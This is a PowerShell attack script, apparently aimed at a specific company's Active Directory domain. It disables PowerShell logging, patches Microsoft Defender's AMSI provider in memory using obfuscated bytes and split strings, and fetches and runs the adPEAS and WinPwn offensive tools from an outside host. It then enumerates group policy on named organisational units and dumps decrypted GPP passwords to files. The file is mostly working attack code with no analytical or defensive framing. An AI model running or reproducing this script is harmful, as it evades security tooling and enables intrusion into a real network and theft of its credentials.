[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$User = $env:UserName
$Domain = $env:USERDOMAIN
$ComputerName = $env:COMPUTERNAME
$tempOut = $env:TEMP

$module = Get-Module Microsoft.PowerShell.Utility # Get target module
$module.LogPipelineExecutionDetails = $false # Set module execution details to false
$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false

$APIs = @"
using System;
using System.Runtime.InteropServices;
public class APIs {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $APIs

$wzys = "0xB8"
$coxo = "0x57"
$hxuu = "0x00"
$eqhh = "0x07"
$paej = "0x80"
$ppiy = "0xC3"
$Patch = [Byte[]] ($wzys,$coxo,$hxuu,$eqhh,+$paej,+$ppiy)

$LoadLibrary = [APIs]::LoadLibrary("MpOav.dll")
$Address = [APIs]::GetProcAddress($LoadLibrary,"DllGetClassObject")
$p = 0
[APIs]::VirtualProtect($Address, [uint32]6, 0x40, [ref]$p)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
$object = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls')
$Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
$Uninitialize.Invoke($object,$null)

$url = "https://attck.community/AD/adPEAS.ps1"
$tempFilePath = "C:\Users\Public\pea.ps1"
Invoke-WebRequest $url -OutFile $tempFilePath 
Import-Module $tempFilePath 
Remove-Item $tempFilePath



$url = "https://attck.community/AD/WinPwn/WinPwn.ps1"
$tempFilePath = "C:\Users\Public\powen.ps1"
Invoke-WebRequest $url -OutFile $tempFilePath 
Import-Module $tempFilePath 
Remove-Item $tempFilePath

Get-NetGPO | Select-String displayname,distinguishedname,objectguid | fl > netgp.txt
Invoke-GPUpdate
Get-GPInheritance -Target "OU=Service Accounts,OU=Reyes Holdings Enterprise,DC=reyesholdings,DC=com"  > C:\Users\Public\out\gp.txt
Get-GPInheritance -Target "OU=T0-Service Accounts,OU=Tier 0,OU=Admin-T,DC=reyesholdings,DC=com" >> C:\Users\Public\out\gp.txt
Get-GPODelegation -Target "OU=Service Accounts,OU=Reyes Holdings Enterprise,DC=reyesholdings,DC=com" >> C:\Users\Public\out\gp.txt
Get-GPODelegation -Target "OU=T0-Service Accounts,OU=Tier 0,OU=Admin-T,DC=reyesholdings,DC=com" >> C:\Users\Public\out\gp.txt
Get-GPPDecryptedCpassword > C:\Users\Public\out\gpdpass.txt